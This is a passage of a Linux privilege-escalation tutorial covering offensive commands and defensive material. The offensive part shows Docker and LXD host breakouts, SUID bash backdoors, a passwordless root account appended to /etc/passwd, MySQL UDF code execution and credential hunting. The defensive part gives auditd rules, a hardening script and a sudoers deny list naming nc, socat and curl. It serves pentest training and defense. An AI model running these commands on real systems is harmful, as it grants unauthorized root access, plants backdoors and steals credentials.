  :::tabs-item{icon="i-simple-icons-docker" label="Docker Group"}
  ```bash [Terminal — Check Group Membership]
  id
  # uid=1000(user) gid=1000(user) groups=1000(user),999(docker)
  #                                                    ^^^^^^ JACKPOT
  ```

  ```bash [Terminal — Docker Escalation Methods]
  # Method 1: Mount host filesystem
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  # You're now root on the HOST filesystem!

  # Method 2: Read sensitive files
  docker run -v /etc/shadow:/shadow --rm alpine cat /shadow

  # Method 3: Add SSH key for root
  docker run -v /root:/mnt --rm alpine sh -c \
    'echo "YOUR_SSH_PUB_KEY" >> /mnt/.ssh/authorized_keys'

  # Method 4: SUID backdoor
  docker run -v /:/mnt --rm alpine sh -c \
    'cp /mnt/bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash'
  /tmp/rootbash -p

  # Method 5: Modify /etc/passwd
  docker run -v /etc:/mnt --rm alpine sh -c \
    'echo "hacker::0:0::/root:/bin/bash" >> /mnt/passwd'
  su hacker
  ```
  :::

  :::tabs-item{icon="i-lucide-container" label="LXD / LXC Group"}
  ```bash [Terminal — LXD Escalation]
  id
  # groups=...,108(lxd)

  # Method 1: Using Alpine image
  # On attacker: download Alpine LXD image
  git clone https://github.com/saghul/lxd-alpine-builder
  cd lxd-alpine-builder && sudo ./build-alpine
  # Transfer the .tar.gz to target

  # On target:
  lxc image import alpine*.tar.gz --alias privesc
  lxc init privesc exploit -c security.privileged=true
  lxc config device add exploit host-root disk \
    source=/ path=/mnt/root recursive=true
  lxc start exploit
  lxc exec exploit /bin/sh

  # Inside container — full host filesystem at /mnt/root
  cat /mnt/root/etc/shadow
  echo 'hacker::0:0::/root:/bin/bash' >> /mnt/root/etc/passwd
  ```
  :::
::

::caution
Membership in the `docker` group should be treated as **equivalent to root access**. Never add untrusted users to this group.
::

---

### Technique 12 — Exploiting Services Running as Root

::accordion
  :::accordion-item{icon="i-lucide-database" label="MySQL Running as Root"}
  ```bash [Terminal — MySQL UDF Exploitation]
  # Check if MySQL runs as root
  ps aux | grep mysql
  # root  1234  ... /usr/sbin/mysqld

  # If you have MySQL root access:
  mysql -u root -p

  # Method: User-Defined Function (UDF)
  # 1. Find plugin directory
  SELECT @@plugin_dir;
  # /usr/lib/mysql/plugin/

  # 2. Compile UDF library (on attacker)
  gcc -g -c raptor_udf2.c -fPIC
  gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

  # 3. Load into MySQL
  USE mysql;
  CREATE TABLE foo(line blob);
  INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
  SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
  CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
  SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');

  # 4. Exit MySQL and escalate
  /tmp/rootbash -p
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Writable Web Server Configs"}
  ```bash [Terminal — Apache/Nginx Running as Root]
  # If you can write to web server config files:
  ls -la /etc/apache2/sites-enabled/
  ls -la /etc/nginx/conf.d/

  # Or if the web root is writable and server runs CGI as root:
  echo '#!/bin/bash
  cp /bin/bash /tmp/rootbash
  chmod +s /tmp/rootbash' > /var/www/html/shell.cgi
  chmod +x /var/www/html/shell.cgi
  curl http://localhost/shell.cgi
  /tmp/rootbash -p
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Screen / Tmux Sockets"}
  ```bash [Terminal — Hijack Root Screen Sessions]
  # Find screen sockets
  ls -la /var/run/screen/
  ls -la /tmp/screens/

  # Find tmux sockets
  ls -la /tmp/tmux-0/    # tmux-<UID>/

  # If a root screen/tmux session exists and socket is accessible:
  export TERM=xterm
  screen -x root/session_name
  # or
  tmux -S /tmp/tmux-0/default attach
  ```
  :::

  :::accordion-item{icon="i-lucide-key" label="Password Hunting"}
  ```bash [Terminal — Find Hardcoded Credentials]
  # Search for passwords in config files
  grep -rli "password\|passwd\|pwd\|secret\|token\|api_key" \
    /etc/ /opt/ /var/ /home/ 2>/dev/null

  # Common locations
  cat /var/www/html/wp-config.php 2>/dev/null
  cat /var/www/html/.env 2>/dev/null
  cat /opt/*/config/*.yml 2>/dev/null
  cat /home/*/.bashrc 2>/dev/null | grep -i "pass\|export"

  # Database connection strings
  grep -r "mysql\|postgres\|mongodb\|redis" /etc/ /opt/ /var/www/ \
    2>/dev/null | grep -i "pass"

  # SSH keys
  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
  find / -name ".pgpass" -o -name ".my.cnf" -o -name ".netrc" 2>/dev/null

  # Bash history
  find /home -name ".bash_history" -exec cat {} \; 2>/dev/null
  cat /root/.bash_history 2>/dev/null

  # Memory / process inspection
  strings /proc/*/environ 2>/dev/null | grep -i "pass\|key\|secret"
  ```
  :::
::

---

## Quick Reference — Escalation Checklist

Use this checklist during every engagement:

| # | Check | Command | What to Look For |
|---|---|---|---|
| 1 | Kernel version | `uname -a` | Outdated → kernel exploits |
| 2 | Sudo privileges | `sudo -l` | `NOPASSWD`, wildcards, env_keep |
| 3 | SUID binaries | `find / -perm -4000 2>/dev/null` | Non-standard binaries |
| 4 | Capabilities | `getcap -r / 2>/dev/null` | `cap_setuid`, `cap_sys_admin` |
| 5 | Cron jobs | `cat /etc/crontab; pspy` | Writable scripts, relative paths |
| 6 | Writable /etc/passwd | `ls -la /etc/passwd` | World-writable |
| 7 | Readable /etc/shadow | `cat /etc/shadow` | Crackable hashes |
| 8 | NFS shares | `cat /etc/exports` | `no_root_squash` |
| 9 | Docker/LXD group | `id` | Group membership |
| 10 | Running services | `ps aux \| grep root` | Root services with vulns |
| 11 | World-writable files | `find / -writable 2>/dev/null` | Config files, scripts |
| 12 | SSH keys | `find / -name id_rsa 2>/dev/null` | Private keys |
| 13 | Passwords in files | `grep -r password /etc/ /opt/` | Hardcoded credentials |
| 14 | History files | `cat ~/.*history` | Previous commands with passwords |
| 15 | Internal services | `ss -tulnp` | Services only on localhost |

---

## Detection & Defense

::tabs
  :::tabs-item{icon="i-lucide-shield-check" label="Hardening Checklist"}

  | # | Control | Priority | Implementation |
  |---|---|---|---|
  | 1 | **Keep kernel updated** | 🔴 Critical | `apt upgrade` / `yum update` regularly |
  | 2 | **Audit SUID binaries** | 🔴 Critical | Remove unnecessary SUID bits |
  | 3 | **Restrict sudo access** | 🔴 Critical | Specific commands, no wildcards |
  | 4 | **Enable audit logging** | 🟠 High | `auditd` with proper rules |
  | 5 | **Remove users from docker/lxd** | 🟠 High | Use rootless Docker instead |
  | 6 | **Secure NFS exports** | 🟠 High | Use `root_squash` (default) |
  | 7 | **Set proper file permissions** | 🟠 High | `/etc/passwd` 644, `/etc/shadow` 640 |
  | 8 | **Disable unused services** | 🟡 Medium | Minimize attack surface |
  | 9 | **Use SELinux/AppArmor** | 🟡 Medium | Mandatory Access Control |
  | 10 | **Monitor cron jobs** | 🟡 Medium | Alert on crontab modifications |

  :::

  :::tabs-item{icon="i-lucide-search" label="Detection Rules"}
  ```bash [auditd Rules — /etc/audit/rules.d/privesc.rules]
  # Monitor changes to critical files
  -w /etc/passwd -p wa -k passwd_changes
  -w /etc/shadow -p wa -k shadow_changes
  -w /etc/sudoers -p wa -k sudoers_changes
  -w /etc/crontab -p wa -k crontab_changes
  -w /etc/cron.d/ -p wa -k crond_changes

  # Monitor SUID/SGID bit changes
  -a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat \
    -F auid>=1000 -F auid!=4294967295 -k suid_changes

  # Monitor privilege escalation attempts
  -a always,exit -F arch=b64 -S setuid -S setgid -S setreuid \
    -S setregid -F auid>=1000 -k priv_escalation

  # Monitor capability changes
  -a always,exit -F arch=b64 -S capset -k capability_changes

  # Monitor sudo usage
  -w /usr/bin/sudo -p x -k sudo_usage
  -w /var/log/sudo.log -p wa -k sudo_log

  # Monitor container tools
  -w /usr/bin/docker -p x -k docker_usage
  -w /usr/bin/lxc -p x -k lxc_usage

  # Monitor passwd/shadow reads by non-root
  -a always,exit -F arch=b64 -S open -S openat \
    -F path=/etc/shadow -F auid>=1000 -k shadow_access
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Hardening Scripts"}
  ```bash [harden.sh — Basic Privilege Escalation Prevention]
  #!/bin/bash
  # Run as root

  echo "[*] Auditing SUID binaries..."
  EXPECTED_SUID=(
    /usr/bin/passwd /usr/bin/sudo /usr/bin/mount
    /usr/bin/umount /usr/bin/su /usr/bin/newgrp
    /usr/bin/chfn /usr/bin/chsh /usr/bin/gpasswd
    /usr/bin/pkexec
  )
  
  find / -perm -4000 -type f 2>/dev/null | while read binary; do
    if [[ ! " ${EXPECTED_SUID[@]} " =~ " ${binary} " ]]; then
      echo "  [!] UNEXPECTED SUID: $binary"
    fi
  done

  echo "[*] Checking file permissions..."
  [[ $(stat -c %a /etc/passwd) != "644" ]] && echo "  [!] /etc/passwd permissions: $(stat -c %a /etc/passwd)"
  [[ $(stat -c %a /etc/shadow) != "640" ]] && echo "  [!] /etc/shadow permissions: $(stat -c %a /etc/shadow)"

  echo "[*] Checking for users in dangerous groups..."
  for group in docker lxd lxc disk adm; do
    members=$(getent group $group 2>/dev/null | cut -d: -f4)
    [[ -n "$members" ]] && echo "  [!] $group group members: $members"
  done

  echo "[*] Checking NFS exports..."
  grep "no_root_squash" /etc/exports 2>/dev/null && echo "  [!] no_root_squash found in NFS exports!"

  echo "[*] Checking capabilities..."
  getcap -r / 2>/dev/null | grep -v "\/snap\/" | while read line; do
    echo "  [!] Capability set: $line"
  done

  echo "[*] Checking cron scripts permissions..."
  for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    find $dir -type f 2>/dev/null | while read script; do
      perms=$(stat -c %a "$script")
      if [[ "$perms" =~ [2367]$ ]]; then
        echo "  [!] World/Group-writable cron script: $script ($perms)"
      fi
    done
  done

  echo "[*] Hardening scan complete."
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Secure Sudo Configuration"}
  ```bash [/etc/sudoers — Secure Configuration]
  # Restrict sudo to specific commands with FULL paths
  # BAD:
  # user ALL=(ALL) NOPASSWD: /usr/bin/vim
  # user ALL=(ALL) NOPASSWD: /usr/bin/find
  # user ALL=(ALL) NOPASSWD: /usr/bin/python3

  # GOOD — minimal, specific commands:
  user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
  user ALL=(ALL) NOPASSWD: /usr/local/bin/deploy.sh

  # NEVER allow these in sudo:
  # vim, vi, nano, less, more, man, awk, find, env,
  # python, python3, perl, ruby, lua, php, node,
  # tar, zip, docker, bash, sh, dash, ash, zsh,
  # nmap, wget, curl, ftp, ssh, nc, ncat, socat,
  # cp, mv, tee, dd, git, pip, gcc, make

  # Disable env_keep for LD_PRELOAD
  Defaults    env_reset
  Defaults    !env_keep+="LD_PRELOAD"
  Defaults    !env_keep+="LD_LIBRARY_PATH"
  Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

  # Enable sudo logging
  Defaults    logfile="/var/log/sudo.log"
  Defaults    log_input, log_output
  ```
  :::
::

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Method |
|---|---|---|
| [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | Kernel exploits, PwnKit |
| [T1548.001](https://attack.mitre.org/techniques/T1548/001/) | Setuid and Setgid | SUID binary abuse |
| [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | Sudo and Sudo Caching | Sudo misconfigurations |
| [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | Cron | Cron job hijacking |
| [T1574.006](https://attack.mitre.org/techniques/T1574/006/) | Dynamic Linker Hijacking | LD_PRELOAD, library hijacking |
| [T1574.007](https://attack.mitre.org/techniques/T1574/007/) | Path Interception by PATH | PATH variable hijacking |
| [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Credentials In Files | Passwords in configs/history |
| [T1611](https://attack.mitre.org/techniques/T1611/) | Escape to Host | Docker/LXD container breakout |
| [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | Valid Accounts: Local | Cracked passwords, SSH keys |

---

## Practice Labs

::card-group
  ::card
  ---
  title: TryHackMe — Linux PrivEsc
  icon: i-lucide-graduation-cap
  to: https://tryhackme.com/room/linuxprivesc
  target: _blank
  ---
  Guided room covering SUID, sudo, cron, PATH, NFS, and kernel exploit techniques with hands-on VMs.
  ::

  ::card
  ---
  title: HackTheBox — Linux Machines
  icon: i-lucide-box
  to: https://www.hackthebox.com/
  target: _blank
  ---
  Real-world Linux machines ranging from Easy to Insane difficulty. Each requires privilege escalation to capture the root flag.
  ::

  ::card
  ---
  title: OverTheWire — Bandit & Narnia
  icon: i-lucide-terminal
  to: https://overthewire.org/wargames/
  target: _blank
  ---
  Progressive wargames that teach Linux fundamentals, SUID exploitation, and binary analysis through escalating challenges.
  ::

  ::card
  ---
  title: Proving Grounds — OffSec Labs
  icon: i-lucide-sword
  to: https://www.offsec.com/labs/
  target: _blank
  ---
  OSCP-style practice machines with realistic Linux privilege escalation scenarios. Includes community and official machines.
  ::
::

---

## Reference & Resources

::card-group
  ::card
  ---
  title: GTFOBins
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/
  target: _blank
  ---
  The definitive reference for Unix binaries exploitable for privilege escalation — SUID, sudo, capabilities, and more. **Bookmark this.**
  ::

  ::card
  ---
  title: LinPEAS — Privilege Escalation Awesome Scripts
  icon: i-simple-icons-github
  to: https://github.com/peass-ng/PEASS-ng
  target: _blank
  ---
  The most comprehensive automated enumeration tool. Highlights escalation vectors with color-coded output. Essential for every pentest.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — Linux PrivEsc
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
  target: _blank
  ---
  Exhaustive cheatsheet of Linux privilege escalation techniques with copy-paste commands for every vector.
  ::

  ::card
  ---
  title: HackTricks — Linux PrivEsc
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
  target: _blank
  ---
  Detailed methodology guide covering enumeration, exploitation, and post-exploitation for Linux systems.
  ::

  ::card
  ---
  title: MITRE ATT&CK — Privilege Escalation
  icon: i-lucide-shield
  to: https://attack.mitre.org/tactics/TA0004/
  target: _blank
  ---
  Complete framework mapping of privilege escalation techniques used by real-world threat actors and APT groups.
  ::

  ::card
  ---
  title: Linux Kernel CVEs
  icon: i-lucide-bug
  to: https://www.linuxkernelcves.com/
  target: _blank
  ---
  Searchable database of Linux kernel vulnerabilities by version. Essential for identifying applicable kernel exploits.
  ::
::

---

::warning
**Legal Disclaimer:** The techniques described in this guide are intended for **authorized penetration testing**, **CTF competitions**, **security research**, and **defensive education** only. Always obtain **written permission** before testing on any system. Unauthorized access is a criminal offense under the CFAA, Computer Misuse Act, and equivalent laws worldwide.
::